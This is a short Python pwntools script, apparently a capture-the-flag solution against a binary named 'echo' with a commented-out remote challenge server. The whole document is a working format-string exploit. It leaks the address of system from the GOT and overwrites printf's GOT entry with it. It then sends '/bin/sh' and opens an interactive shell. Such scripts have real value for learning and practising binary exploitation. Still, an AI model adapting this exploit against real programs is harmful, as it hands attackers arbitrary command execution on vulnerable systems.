from pwn import *
context.log_level = 'debug'

io = process("./echo")
#io = remote("hackme.inndy.tw",7711)
elf = ELF("./echo")

sys_got_addr = elf.got['system']
sys_plt_addr = elf.plt['system']
printf_got_addr = elf.got['printf']
print 'printf_got_addr = %s' % printf_got_addr

payload = p32(sys_got_addr) + '%7$s'
print payload
io.sendline(payload)
a = io.recv()
print a
sys_addr = u32(a[4:8])

print 'sys_addr = %s' % str(hex(sys_addr))
print 'sys_plt_addr = %s' % str(hex(sys_plt_addr)) 
payload = fmtstr_payload( 7, {printf_got_addr: sys_addr} )
io.sendline(payload)

io.sendline("/bin/sh")

#exit 
#io.sendline("exit\n")

io.interactive()
